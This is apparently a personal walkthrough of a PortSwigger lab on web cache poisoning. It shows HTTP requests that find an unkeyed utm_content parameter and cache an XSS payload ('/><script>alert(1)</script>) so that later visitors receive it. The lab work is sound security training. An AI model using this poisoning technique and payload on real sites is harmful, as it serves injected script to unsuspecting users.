
# Web cache poisoning via an unkeyed query parameter

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

Hint: Websites often exclude certain UTM analytics parameters from the cache key.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/1.png)

---------------------------------------------


```
GET / HTTP/2
...
Pragma: x-get-cache-key
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/2.png)


```
GET /test=ing123
...
Pragma: x-get-cache-key
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/3.png)


Then I added headers for a cache buster and find "Origin" header is an oracle buster. We also see the query is reflected in the response:

```
GET /?test=ing123 HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0a4b00720459a58f800058b200dc0063.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/4.png)

We could pop an alert with the payload:

```
GET /?test=ing123'/><script>alert(1)</script><link+href='/ 
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/5.png)


However, it is not possible to cache this for an attack, because this query parameter is keyed. We must find one query parameter that is not keyed:







![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/6.png)
![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/7.png)
![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/8.png)


We can add this parameter and see how it is not part of the response header “X-Cache-Key”:

```
GET /?test=ing123&utm_content=testing123 HTTP/2
...
Pragma: x-get-cache-key
Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/9.png)


Then use the previous payload for this new parameter:

```
GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
...
Pragma: x-get-cache-key
Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/10.png)



Then again without the parameter, we see the same response with the alert(1):



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/11.png)


The with the payload and without the “Origin” header:



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/12.png)



And finally without the payload or the “Origin” header:



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/13.png)